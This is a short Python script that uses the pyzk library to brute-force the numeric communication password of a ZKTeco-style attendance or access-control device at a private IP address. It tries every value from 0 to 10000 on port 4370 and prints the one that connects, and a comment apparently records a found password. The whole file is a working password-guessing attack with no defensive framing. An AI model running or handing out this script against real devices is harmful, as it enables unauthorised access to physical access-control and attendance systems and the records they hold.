from zk import ZK, const
#1253
ip = '192.168.100.223'

conn = None
for i in range(0,10001):
    # print(i)
    try:
        zk = ZK(ip, port=4370, timeout=5, password=i, force_udp=False, ommit_ping=True)
        conn = zk.connect()
        print("Password Found --> ",i)
        break
    except Exception as e:
        print(i,e)
    finally:
        if conn:
            conn.disconnect()
